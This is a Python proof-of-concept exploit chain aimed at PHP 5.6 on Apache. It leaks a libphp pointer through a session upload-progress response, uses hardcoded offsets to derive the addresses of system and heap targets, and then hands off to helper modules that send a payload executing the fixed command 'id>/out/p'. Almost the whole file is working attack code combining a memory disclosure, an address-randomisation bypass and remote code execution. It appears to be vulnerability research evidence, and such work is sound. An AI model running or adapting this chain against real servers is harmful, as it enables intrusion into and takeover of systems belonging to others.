#!/usr/bin/env python3
"""HTTP-response-only PHP 5.6 mbstring disclosure to fixed local proof.

The only command embedded in the terminal carrier is ``id>/out/p``.
"""

from __future__ import annotations

import argparse
import json
import re
import time
from pathlib import Path

import probe56_leak as http
import sequence56_rce as terminal


FIXED_COMMAND = b"id>/out/p"
LEAKED_SYMBOL_OFFSET = 0xCA0C80
SYSTEM_FROM_LIBPHP = 0x3A74480
STALE_FROM_LIBPHP = 0x48103C0
CARRIER_FROM_LIBPHP = 0x480C628


def status(response: bytes) -> str:
    return response.partition(b"\r\n")[0].decode("latin1", "replace")


def dechunk(response: bytes) -> bytes:
    headers, separator, body = response.partition(b"\r\n\r\n")
    if not separator:
        return b""
    if b"transfer-encoding: chunked" not in headers.lower():
        return body
    decoded = bytearray()
    offset = 0
    while offset < len(body):
        end = body.find(b"\r\n", offset)
        if end < 0:
            break
        try:
            size = int(body[offset:end].split(b";", 1)[0], 16)
        except ValueError:
            break
        offset = end + 2
        if size == 0:
            break
        if offset + size > len(body):
            break
        decoded += body[offset:offset + size]
        offset += size
        if body[offset:offset + 2] != b"\r\n":
            break
        offset += 2
    return bytes(decoded)


def leak_consumer() -> bytes:
    parts = [
        {"name": b"900001", "data": b"R" * 1048551},
        {"name": b"900002", "data": b"S" * 1041384},
        {"name": b"PHPSESSID", "data": b"attacksessionid0001attacksessi"},
        {"name": b"PHP_SESSION_UPLOAD_PROGRESS", "data": b"xyzxyzxy"},
    ]
    boundary = b"C" * 78
    return http.post(
        "/leak.php",
        http.multipart(parts, boundary),
        boundary,
        600.0,
    )


def parse_http_pointer(response: bytes) -> tuple[int, bytes]:
    body = dechunk(response)
    match = re.search(br"PROGRESSHEX:([0-9a-f]{16})", body)
    if not match:
        raise RuntimeError(
            "leak response has no complete 8-byte PROGRESSHEX value: "
            + body[:96].hex()
        )
    raw = bytes.fromhex(match.group(1).decode("ascii"))
    pointer = int.from_bytes(raw, "little")
    if not 0x0000700000000000 <= pointer < 0x0000800000000000:
        raise RuntimeError(f"non-canonical HTTP pointer: {pointer:#x}")
    return pointer, raw


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--out", required=True, type=Path)
    parser.add_argument("--rollover-delay", type=float, default=1.0)
    parser.add_argument("--terminal-target-index", type=int, default=25)
    args = parser.parse_args()
    args.out.mkdir(parents=True, exist_ok=True)

    warm = http.get("/warm.php")
    leak_producer = http.producer(32)
    leak_response = leak_consumer()
    pointer, raw = parse_http_pointer(leak_response)

    libphp_base = pointer - LEAKED_SYMBOL_OFFSET
    if libphp_base & 0xFFF:
        raise RuntimeError(f"derived libphp base is not page aligned: {libphp_base:#x}")
    system = libphp_base + SYSTEM_FROM_LIBPHP
    stale_zval = libphp_base + STALE_FROM_LIBPHP
    carrier = libphp_base + CARRIER_FROM_LIBPHP
    if stale_zval - carrier != 0x3D98:
        raise AssertionError("terminal heap relation mismatch")

    preconsumer = {
        "address_source": (
            "HTTP /leak.php PROGRESSHEX bytes from "
            "POST[PHP_SESSION_UPLOAD_PROGRESS]"
        ),
        "http_value_hex": raw.hex(),
        "http_pointer": hex(pointer),
        "http_pointer_identity": "libphp5.so!mbfl_encoding_ascii",
        "libphp_base": hex(libphp_base),
        "predicted_system": hex(system),
        "predicted_stale_zval": hex(stale_zval),
        "predicted_carrier": hex(carrier),
    }
    (args.out / "preconsumer-address-source.json").write_text(
        json.dumps(preconsumer, indent=2) + "\n", encoding="utf-8"
    )

    # The partial HTTP response is already complete enough to carry the
    # pointer.  Its worker then faults in request shutdown, so the next phase
    # waits for Apache's single prefork slot to clone a fresh child.
    time.sleep(args.rollover_delay)
    terminal.ENDPOINT = "/terminal.php"
    terminal_producer = terminal.producer(32)
    terminal_consumer = terminal.consumer(
        40,
        args.terminal_target_index,
        carrier,
        system,
        248,
    )

    responses = {
        "warm.response": warm,
        "leak-producer.response": leak_producer,
        "leak-consumer.response": leak_response,
        "terminal-producer.response": terminal_producer,
        "terminal-consumer.response": terminal_consumer,
    }
    for name, response in responses.items():
        (args.out / name).write_bytes(response)

    evidence = {
        **preconsumer,
        "relations": {
            "libphp_base": "http_pointer - 0xca0c80",
            "system": "libphp_base + 0x3a74480",
            "stale_zval": "libphp_base + 0x48103c0",
            "carrier": "libphp_base + 0x480c628",
            "carrier_from_stale": "stale_zval - 0x3d98",
        },
        "system": hex(system),
        "stale_zval": hex(stale_zval),
        "carrier": hex(carrier),
        "fixed_command": FIXED_COMMAND.decode("ascii"),
        "terminal_target_index": args.terminal_target_index,
        "terminal_cookie_count": 40,
        "terminal_carrier_length": 248,
        "statuses": {name: status(value) for name, value in responses.items()},
        "instrumentation": False,
        "proc_maps_or_mem": False,
        "gdb": False,
        "ld_preload": False,
    }
    (args.out / "address-source.json").write_text(
        json.dumps(evidence, indent=2) + "\n", encoding="utf-8"
    )
    print(json.dumps(evidence, sort_keys=True), flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
